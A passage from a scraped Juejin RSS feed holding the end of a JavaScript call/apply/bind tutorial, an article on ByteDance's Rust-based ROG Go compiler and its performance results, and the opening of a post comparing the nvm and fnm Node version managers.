<p><strong>call</strong>：适用于参数数量明确、需要立即执行的场景（比如继承：<code>Parent.call(this, arg1)</code>）；</p>
</li>
<li>
<p><strong>apply</strong>：适用于参数是数组/类数组的场景（比如求数组最大值：<code>Math.max.apply(null, arr)</code>）；</p>
</li>
<li>
<p><strong>bind</strong>：适用于需要延迟执行、或需要重复使用绑定 this 后的函数的场景（比如事件回调、定时器：<code>btn.onclick = fn.bind(obj)</code>）。</p>
</li>
</ol>
<h3 data-id="heading-12">五、补充注意点</h3>
<ul>
<li>
<p>如果第一个参数传 <code>null/undefined</code>，在非严格模式下，<code>this</code> 会指向全局对象（浏览器中是 <code>window</code>，Node 中是 <code>global</code>）；严格模式下 <code>this</code>为 <code>null/undefined</code>。</p>
</li>
<li>
<p><code>bind</code> 返回的新函数不能通过 <code>call/apply</code> 再次修改 <code>this</code> 指向（<code>bind</code> 的绑定是永久的）。</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ROG 技术创新和业务落地：基于 Rust 的高性能 Go 编译器]]></title>    <link>https://juejin.cn/post/7581779319572856870</link>    <guid>https://juejin.cn/post/7581779319572856870</guid>    <pubDate>2025-12-10T03:44:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581779319572856870" data-draft-id="7581888578508341275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ROG 技术创新和业务落地：基于 Rust 的高性能 Go 编译器"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2025-12-10T03:44:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CloudWeGo"/> <meta itemprop="url" content="https://juejin.cn/user/3998273922407624"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ROG 技术创新和业务落地：基于 Rust 的高性能 Go 编译器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3998273922407624/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CloudWeGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:44:29.000Z" title="Wed Dec 10 2025 03:44:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>合作是技术创新的关键，Go 与 Rust 的跨界融合是优秀实践。多数团队在学习 Rust 时有难度，将大量 Go 代码转为 Rust 耗时费力且容易引发技术问题。</p>
<p>字节跳动在业务实践中也遇到了这个难题：大量 Go 服务在核心场景出现性能瓶颈，但重构难度大。此时，从编译器入手，在不改动代码、不增成本的前提下提升性能，而ROG 正是专注于高性能的 Go 与 Rust 跨界编译器。</p>
<p><strong>本文根据字节跳动服务框架团队研发工程师陈卓钰在 CloudWeGo 四周年技术沙龙上的演讲内容整理而成，详细解读了 ROG 的设计思路、核心实现以及在业务中的实际应用效果。</strong></p>
<p>点击链接可查看本次分享回放👉🏻<a href="https://link.juejin.cn?target=https%3A%2F%2Fb23.tv%2FYnSyAZy" target="_blank" title="https://b23.tv/YnSyAZy" ref="nofollow noopener noreferrer">b23.tv/YnSyAZy</a></p>
<h4 data-id="heading-0">一、业务痛点：当 Go 的性能成为瓶颈</h4>
<p>字节跳动有大量基于 Go 开发的服务，其中不少还是核心业务，Go 服务在整体服务中占比超过一半。但在一些计算量很大的场景下，Go 语言逐渐暴露出性能不足的问题，无法充分发挥现代 CPU 的计算能力，导致资源没有得到最优利用。
Go 语言更注重编译速度和开发效率，但在追求更高性能和更低成本的背景下，它编译后的代码执行效率成了"降本增效"的一大阻碍。之前，大部分优化工作都集中在技术架构和业务逻辑方面，而服务框架团队选择从编译器本身入手，在不改动任何业务代码的情况下，为庞大的 Go 服务体系提升性能。
对于 ROG 这类复杂项目，明确目标与非目标至关重要：</p>
<ul>
<li>
<p><strong>核心目标：</strong> 与 Go 语言特性完全兼容，保证任何合法 Go 程序在 ROG 中正常运行且结果一致；打造高性能运行环境；支持 LLVM 的高级优化功能如 LTO、PGO、BOLT 等；构建可扩展的编译器架构。</p>
</li>
<li>
<p><strong>非目标：</strong> 暂时不支持自举；不追求编译速度，开发阶段可用标准 Go 编译器提效，生产阶段切换 ROG 追求性能；暂时不兼容 Plan9 汇编和 linkname 内部符号，底层代码重写导致难以保证一致且兼容性实现难度大。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6658d7a43a304c718a673fc3be030bca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943069&amp;x-signature=Gm66DfnZKt10Puc7VU8U7aQBctw%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-1">二、技术挑战：在 LLVM 上重构带 GC 的编译型语言</h4>
<p>把 Go 和业界最成熟的编译器后端 LLVM 结合起来，并不是第一次尝试。但是，像版本老旧、没人维护的 <code>gccgo</code>，或者应用场景有限、功能不完整的 <code>TinyGo</code>，这些现有的方案都不能满足字节跳动大规模、高性能的业务需求。
因此，服务框架团队决定自己开发一款基于 Rust 和 LLVM 的全新 Go 编译器 ------ ROG。最大的挑战在于，LLVM 最初是为 C++ 这类没有 GC 功能的语言设计的，在处理像 Go 这种"编译型 + 带 GC"的语言时，会遇到三个主要问题：</p>
<ul>
<li>
<p><strong>GC 指针追踪</strong>：如何在 LLVM IR 层面准确地插入写屏障，保证 GC 能够追踪到所有指针，避免出现内存泄漏。</p>
</li>
<li>
<p><strong>栈动态扩缩容</strong>：Go 协程的栈空间会根据需要动态变化，在函数调用时需要插入额外的栈检查代码，而 LLVM 的标准流程里没有对这个功能的原生支持。</p>
</li>
<li>
<p><strong>抢占式调度</strong>：为了避免信号带来的复杂异步问题，ROG 需要设计一套基于 Checkpoint 的确定性调度机制，在函数开始时进行检查，防止某个任务长时间占用调度器。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ba6ec59a90742109717efe3160531b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943069&amp;x-signature=MOlOGcg0uWQZky%2BOdvD%2BP4LomfU%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-2">三、方案设计：高性能、可扩展的 ROG 编译器</h4>
<p>ROG 的主要目标是在完全兼容 Go 语言特性的基础上，打造一款高性能、可扩展的编译器。它由前端、中间优化流程和基于 Rust 的运行环境组成，最后通过 LLVM 后端生成经过高度优化的机器码。ROG 包含多个核心组件，如内存分配器、垃圾回收器（GC）等。</p>
<h5 data-id="heading-3">（一）内存分配器：分级管理 + 无锁优化，解决主流方案痛点</h5>
<ul>
<li><strong>现有内存分配器的问题</strong>：团队研究了 jemalloc、TCMalloc、bdw - gc 等几种主流的内存分配方案，发现都不能完全满足需求。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16bc12af0d85437e9b78a94e1e14195c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943069&amp;x-signature=sCnaOHs72bMq7J9TS%2BKMWgyeR5c%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>ROG 分级内存管理方案设计</strong>：针对以上问题，团队设计了专门的方案，主要优点包括：支持最大 1TB 的堆内存，能够在运行时对对象进行索引，支持批量释放，并且缓存的局部性很好。</p>
</li>
<li>
<p><strong>核心分配逻辑</strong>：</p>
<ol>
<li>
<p>优先从当前线程的空闲内存块中获取内存，在频繁分配内存的场景下不需要加锁；</p>
</li>
<li>
<p>如果要分配的对象超过了一定大小，就会触发内存扩容，使用新的内存块来存储；</p>
</li>
<li>
<p>物理内存以操作系统的页面为基本单位，多个页面组合成 Chunk 进行统一管理；</p>
</li>
<li>
<p>P 和线程是一一对应的，线程操作 P 上的内存资源是线程私有的；只有在操作全局的 TLSFAlloc 和 BuddyAlloc 时才需要进行同步，这样能保证高性能。</p>
</li>
</ol>
</li>
</ul>
<h5 data-id="heading-4">（二）垃圾回收器：多策略支持 + 高效流程，兼顾兼容性与性能</h5>
<ul>
<li>
<p><strong>支持的 GC 策略</strong>：ROG 的垃圾回收器支持 STW GC、三色标记 GC 等多种算法，目前默认使用 STW GC。</p>
</li>
<li>
<p><strong>核心工作流程</strong>：</p>
<ol>
<li>
<p>标记准备：暂停所有的 P（逻辑处理器）和 G（协程），为标记阶段做准备；</p>
</li>
<li>
<p>并发标记：从 GCRoots 开始，多个线程同时标记存活的对象，把当前对象引用的未标记对象加入队列，直到所有能访问到的对象都被标记；</p>
</li>
<li>
<p>终止标记：因为 Go 支持 Finalizer 特性，有些对象需要"复活"，由单线程处理复活逻辑，同时复活相关对象及其引用的所有对象；</p>
</li>
<li>
<p>并发清理：直接清理没有被标记的对象，把标记为存活的对象作为下一次 GC 的初始对象，调用析构函数完成整个 GC 流程。</p>
</li>
</ol>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b115927d8e564427a23e6b6ebabb573d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943069&amp;x-signature=rzq3oKMr7qd1F77sGUAVNlmqklA%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-5">四、落地成效：CPU 显著下降，QPS 提升 10%+</h4>
<p>ROG 在实际业务场景中的应用取得了明显的性能提升。</p>
<ul>
<li>
<p><strong>计算密集型场景</strong> ：对于纯计算的多线程程序，用原生 Go 编译需要 12.99 秒，用 ROG 编译后，时间缩短到了 <strong>2.91 秒</strong> ，性能提升了 <strong>346%</strong>。</p>
</li>
<li>
<p><strong>微服务框架场景</strong> ：在 Kitex 框架的性能测试中，用 ROG 编译的版本和原生 Go 相比，每秒请求数从 330051 提高到了 <strong>364808</strong> ，提升了 <strong>10.5%</strong>。</p>
</li>
<li>
<p><strong>线上业务表现</strong>：</p>
<ul>
<li>
<p>服务 A：平均 CPU 使用率从 54.5% 降到了 <strong>45%</strong> ，降低了 <strong>9.5%</strong>。</p>
</li>
<li>
<p>服务 B：平均 CPU 使用率从 36% 降到了 <strong>22%</strong> ，降低了 <strong>14%</strong>。</p>
</li>
</ul>
</li>
</ul>
<p>更重要的是，由于 ROG 的运行环境是用 Rust 开发的，天生就支持 <strong>Go 和 Rust 的混合编译和链接</strong>。这意味着开发者可以直接在 Go 代码中调用高性能的 Rust 或 C 函数，不用再通过 CGo 进行复杂的封装，为业务的进一步优化提供了新的可能。</p>
<h4 data-id="heading-6">五、未来展望：迈向更深度的跨语言融合</h4>
<p>目前，ROG 已经证明了它在性能优化方面的价值，但这只是个开端。服务框架团队的目标不仅仅是让 Go 代码运行得更快，还希望探索两种语言生态的深度融合；理想情况下，希望未来的 ROG 不只是一个编译器，还能成为连接 Go 和 Rust 的桥梁。</p>
<p>未来，会重点支持 LLVM 的更多高级优化功能，比如 PGO 和 LTO，进一步挖掘性能潜力，同时也会不断优化 ROG 的运行环境，尝试在更多核心业务场景中应用，为开发者提供一个无缝、高效的跨语言开发体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 nvm 到 fnm：一个前端老兵的版本管理工具迁移实录]]></title>    <link>https://juejin.cn/post/7581779319572873254</link>    <guid>https://juejin.cn/post/7581779319572873254</guid>    <pubDate>2025-12-10T03:54:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581779319572873254" data-draft-id="7581751726506049579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 nvm 到 fnm：一个前端老兵的版本管理工具迁移实录"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T03:54:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="若尘的技术之旅"/> <meta itemprop="url" content="https://juejin.cn/user/2700056286215032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 nvm 到 fnm：一个前端老兵的版本管理工具迁移实录
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2700056286215032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    若尘的技术之旅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:54:20.000Z" title="Wed Dec 10 2025 03:54:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从 nvm 到 fnm：一个前端老兵的版本管理工具迁移实录</h2>
<h3 data-id="heading-1">引子：那个让我崩溃的早晨</h3>
<p>某个周一早晨，我像往常一样打开终端准备开始工作。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 打开 iTerm2... 等待... 等待...</span>
<span class="hljs-comment"># 终于出现命令提示符，耗时 2.3 秒</span>
</code></pre>
<p>接着切换到一个需要 Node 16 的老项目：</p>
<pre><code class="hljs language-bash" lang="bash">$ nvm use 16
Now using node v16.20.2 (npm v8.19.4)
<span class="hljs-comment"># 又是 0.5 秒过去了</span>
</code></pre>
<p>然后跳到另一个 Node 20 的新项目：</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> ../new-project
$ nvm use 20
Now using node v20.19.6 (npm v10.8.2)
<span class="hljs-comment"># 再等 0.5 秒</span>
</code></pre>
<p>一天下来，在 5-6 个项目间来回切换，光是等 nvm 响应就浪费了不知道多少时间。更别提有时候忘记 <code>nvm use</code>，直接 <code>npm install</code> 导致 node_modules 版本混乱的惨剧了。</p>
<p><strong>是时候做出改变了。</strong></p>
<h3 data-id="heading-2">为什么要离开 nvm？</h3>
<h4 data-id="heading-3">痛点一：Shell 启动慢得令人发指</h4>
<p>nvm 是纯 Bash 脚本实现的。每次打开新终端，它都要：</p>
<ol>
<li>加载 <code>nvm.sh</code> 脚本（几千行）</li>
<li>解析已安装的 Node 版本</li>
<li>设置环境变量</li>
<li>初始化自动补全</li>
</ol>
<p>我用 <code>time</code> 测了一下我的 <code>.zshrc</code> 加载时间：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 有 nvm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
zsh -i -c <span class="hljs-built_in">exit</span>  0.42s user 0.23s system 95% cpu 0.678 total

<span class="hljs-comment"># 注释掉 nvm 后</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
zsh -i -c <span class="hljs-built_in">exit</span>  0.08s user 0.05s system 92% cpu 0.142 total
</code></pre>
<p><strong>nvm 让我的终端启动慢了近 5 倍！</strong></p>
<h4 data-id="heading-4">痛点二：版本切换不够智能</h4>
<p>每次进入不同项目都要手动 <code>nvm use</code>，太原始了。虽然有 <code>avn</code>、<code>nvm-auto</code> 等插件可以实现自动切换，但：</p>
<ul>
<li>又增加了一层依赖</li>
<li>又拖慢了 Shell 速度</li>
<li>配置起来也挺麻烦</li>
</ul>
<h4 data-id="heading-5">痛点三：Windows 支持是个笑话</h4>
<p>nvm 官方根本不支持 Windows。<code>nvm-windows</code> 是另一个独立项目，命令和行为都有差异。团队里用 Windows 的同事经常遇到各种奇怪问题。</p>
<h4 data-id="heading-6">痛点四：偶发的诡异 Bug</h4>
<p>用了几年 nvm，遇到过各种奇怪问题：</p>
<ul>
<li>全局安装的包莫名消失</li>
<li><code>npm prefix</code> 路径错乱</li>
<li>多个终端窗口版本不同步</li>
<li><code>.nvmrc</code> 有时候不生效</li>
</ul>
<h3 data-id="heading-7">遇见 fnm：Rust 带来的性能革命</h3>
<p>fnm（Fast Node Manager）是用 Rust 写的 Node.js 版本管理器。第一次用的时候，我的反应是：</p>
<blockquote>
<p>"就这？结束了？怎么这么快？"</p>
</blockquote>
<h4 data-id="heading-8">性能实测对比</h4>
<p>我在自己的 M1 MacBook Pro 上做了详细测试：</p>
<h5 data-id="heading-9">终端启动时间</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
0.678 total

<span class="hljs-comment"># fnm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
0.089 total

<span class="hljs-comment"># 提升：7.6 倍</span>
</code></pre>
<h5 data-id="heading-10">版本切换时间</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm</span>
$ time nvm use 20
Now using node v20.19.6
real    0m0.347s

<span class="hljs-comment"># fnm</span>
$ time fnm use 20
Using Node v20.19.6
real    0m0.012s

<span class="hljs-comment"># 提升：29 倍</span>
</code></pre>
<h5 data-id="heading-11">安装新版本</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm install 22</span>
<span class="hljs-comment"># 总耗时约 45 秒（包含下载）</span>

<span class="hljs-comment"># fnm install 22</span>
<span class="hljs-comment"># 总耗时约 38 秒（包含下载）</span>

<span class="hljs-comment"># 下载速度差不多，但 fnm 的解压和配置更快</span>
</code></pre>
<h4 data-id="heading-12">为什么 fnm 这么快？</h4>
<ol>
<li><strong>原生二进制</strong>：Rust 编译成机器码，不需要解释器</li>
<li><strong>并行处理</strong>：充分利用多核 CPU</li>
<li><strong>惰性加载</strong>：只在需要时才读取版本信息</li>
